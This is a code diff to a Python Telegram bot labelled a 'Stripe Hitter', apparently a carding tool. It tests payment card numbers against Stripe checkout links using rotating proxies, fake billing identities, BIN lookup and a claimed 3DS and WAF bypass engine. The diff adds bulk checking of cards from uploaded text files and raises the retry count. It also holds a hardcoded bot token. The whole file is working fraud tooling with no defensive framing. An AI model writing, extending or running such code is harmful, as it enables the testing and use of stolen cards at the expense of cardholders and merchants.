@@ -15,16 +15,16 @@ import math
 import numpy as np
 from scipy.interpolate import interp1d
 
-from aiogram import Bot, Dispatcher, types
+from aiogram import Bot, Dispatcher, F
 from aiogram.filters import Command
-from aiogram.types import Message
+from aiogram.types import Message, BufferedInputFile
 
 load_dotenv()
 
 # ============= CONFIGURATION =============
-MAX_ATTEMPTS = 10
-CONCURRENT_BATCH_SIZE = 10
-BATCH_DELAY = 5
+MAX_ATTEMPTS = 50
+CONCURRENT_BATCH_SIZE = 5
+BATCH_DELAY = 3
 BOT_TOKEN = "8664861867:AAF5Wq79aekFKDcE6vFT2jFO_3w4jjFgLmk"
 
 bot = Bot(token=BOT_TOKEN)
@@ -262,7 +262,6 @@ class StripeAPIExtractor:
 
 # ============= PROXY MANAGER =============
 class ProxyManager:
-    db_pool = None
     _in_memory_pools: Dict[int, List[Dict]] = {}
     _geo_cache: Dict[str, str] = {}
 
@@ -307,7 +306,7 @@ class ProxyManager:
         if matches: return random.choice(matches)
         return random.choice(pool)
 
-# ============= RANDOM DATA =============
+# ============= RANDOM DATA & BIN =============
 class RandomData:
     FIRST_NAMES = ["James","John","Robert","Michael","William","David","Richard","Joseph","Thomas","Charles"]
     LAST_NAMES = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez"]
@@ -322,7 +321,6 @@ class RandomData:
     async def get_address_and_timezone(proxy_url: Optional[str] = None):
         return {"line1": f"{random.randint(100,9999)} {random.choice(RandomData.STREETS)}", "city": "New York", "state": "NY", "zip": "10001", "country": "US"}, 'America/New_York', 'en-US'
 
-# ============= BIN LOOKUP =============
 class BINLookup:
     _cache: Dict[str, Dict] = {}
 
@@ -356,7 +354,7 @@ def find_receipt_url(d):
             if res: return res
     return None
 
-# ============= STRIPE API HITTER (FULL ADVANCED 3DS + WAF ENGINE) =============
+# ============= STRIPE API HITTER (FULL 3DS + WAF ENGINE) =============
 class StripeAPIHitter:
     _live_js_hash_cache = None
 
@@ -537,7 +535,6 @@ class StripeAPIHitter:
                 sdk = next_action.get('use_stripe_sdk', {}) or {}
                 source = sdk.get('three_d_secure_2_source') or sdk.get('source') or next_action.get('source')
                 
-                # Full 3DS2 EMV Exemption Matrix Sweep (01, 04, 05, 02)
                 if source:
                     auth_headers = {"accept": "application/json", "content-type": "application/x-www-form-urlencoded", "origin": "https://js.stripe.com", "referer": "https://js.stripe.com/", "user-agent": profile["user_agent"]}
                     if self.stripe_account: auth_headers["Stripe-Account"] = self.stripe_account
@@ -746,10 +743,11 @@ class ConcurrentHitter:
 @dp.message(Command("start"))
 async def cmd_start(message: Message):
     await message.answer(
-        "🔥 **Full 3DS Advanced Stripe Hitter Bot** 🔥\n\n"
+        "🔥 **Full Advanced Stripe Hitter Bot** 🔥\n\n"
         "Commands:\n"
         "• `/addproxy <proxy>` - Load proxies (ip:port:user:pass)\n"
-        "• `/hit <stripe_link> <card|mm|yy|cvv>` - Hit target",
+        "• `/hit <stripe_link> <card|mm|yy|cvv>` - Hit single card\n"
+        "• **Upload .txt file with caption `stripe_link`** - Mass check cards!",
         parse_mode="Markdown"
     )
 
@@ -777,15 +775,12 @@ async def cmd_hit(message: Message):
         return
 
     card_dict = {'card': parts[0], 'month': parts[1], 'year': parts[2], 'cvv': parts[3]}
-    status_msg = await message.answer("🔄 Initializing Full 3DS Bypass Engine...")
+    status_msg = await message.answer("🔄 Initializing Advanced Engine...")
 
     async def update_cb(data):
-        if data.get("status") == "analyzing":
-            try: await status_msg.edit_text(f"🔍 {data.get('step', 'Analyzing...')}")
-            except Exception: pass
-        elif data.get("status") == "starting":
+        if data.get("status") == "starting":
             info = data.get("url_info", {})
-            try: await status_msg.edit_text(f"🚀 Session Loaded!\nMerchant: `{info.get('merchant')}`\nAmount: `{info.get('amount')}`\nRunning checks...", parse_mode="Markdown")
+            try: await status_msg.edit_text(f"🚀 Session Loaded!\nMerchant: `{info.get('merchant')}`\nAmount: `{info.get('amount')}`\nRunning check...", parse_mode="Markdown")
             except Exception: pass
         elif data.get("status") == "progress":
             res = data["result"]
@@ -794,13 +789,12 @@ async def cmd_hit(message: Message):
                 f"{icon} **Attempt #{res['attempt']}**\n"
                 f"💳 Card: `{res['card']['card']}`\n"
                 f"📌 Status: `{res['decline_code']}`\n"
-                f"💬 Message: {res.get('error', 'Approved')}\n"
-                f"📊 Progress: {data['completed']}/{data['total']} | Succ: {data['successes']} | Fail: {data['fails']}"
+                f"💬 Message: {res.get('error', 'Approved')}"
             )
             try: await status_msg.edit_text(text, parse_mode="Markdown")
             except Exception: pass
         elif data.get("status") == "completed":
-            try: await status_msg.edit_text(f"🏁 Checking Finished!\nTotal Success: {data['successes']} | Total Fails: {data['fails']}")
+            try: await status_msg.edit_text(f"🏁 Finished! Success: {data['successes']} | Fails: {data['fails']}")
             except Exception: pass
         elif data.get("status") == "error":
             try: await status_msg.edit_text(f"❌ Error: {data['error']}")
@@ -809,8 +803,64 @@ async def cmd_hit(message: Message):
     hitter = ConcurrentHitter(message.from_user.id, url, [card_dict], update_callback=update_cb)
     await hitter.run()
 
+@dp.message(F.document)
+async def handle_txt_file(message: Message):
+    if not message.document.file_name.endswith('.txt'):
+        await message.answer("⚠️ Please upload a valid `.txt` file containing cards.")
+        return
+    
+    caption = message.caption or ""
+    if not caption.startswith('http'):
+        await message.answer("⚠️ Please send the `.txt` file with the Stripe link as caption! Example: upload file with caption `https://checkout.stripe.com/c/pay/...`")
+        return
+
+    url = caption.strip()
+    status_msg = await message.answer("📥 Downloading and parsing card file...")
+
+    try:
+        file_info = await bot.get_file(message.document.file_id)
+        file_bytes = await bot.download_file(file_info.file_path)
+        content = file_bytes.read().decode('utf-8', errors='ignore')
+        
+        cards = []
+        for line in content.splitlines():
+            line = line.strip()
+            if not line: continue
+            parts = line.split('|')
+            if len(parts) >= 4:
+                cards.append({'card': parts[0].strip(), 'month': parts[1].strip(), 'year': parts[2].strip(), 'cvv': parts[3].strip()})
+        
+        if not cards:
+            await status_msg.edit_text("❌ No valid cards found in the text file! Format required: `card|mm|yy|cvv`")
+            return
+
+        await status_msg.edit_text(f"🚀 Loaded {len(cards)} cards from file. Initializing mass check...")
+
+        async def update_cb(data):
+            if data.get("status") == "progress":
+                res = data["result"]
+                icon = "✅" if res['success'] else "❌"
+                text = (
+                    f"{icon} **Card #{data['completed']}/{data['total']}**\n"
+                    f"💳 `{res['card']['card']}`\n"
+                    f"📌 Status: `{res['decline_code']}`\n"
+                    f"💬 Message: {res.get('error', 'Approved')}\n"
+                    f"📊 Succ: {data['successes']} | Fail: {data['fails']}"
+                )
+                try: await status_msg.edit_text(text, parse_mode="Markdown")
+                except Exception: pass
+            elif data.get("status") == "completed":
+                try: await status_msg.edit_text(f"🏁 Mass Check Completed!\nTotal Cards: {data['successes'] + data['fails']}\nSuccesses: {data['successes']}\nFails: {data['fails']}")
+                except Exception: pass
+
+        hitter = ConcurrentHitter(message.from_user.id, url, cards, update_callback=update_cb)
+        await hitter.run()
+
+    except Exception as e:
+        await status_msg.edit_text(f"❌ Failed to process file: {str(e)}")
+
 async def main():
-    print("🤖 Full 3DS Advanced Stripe Telegram Bot started...")
+    print("🤖 Full Advanced Stripe Telegram Bot with File Reader started...")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
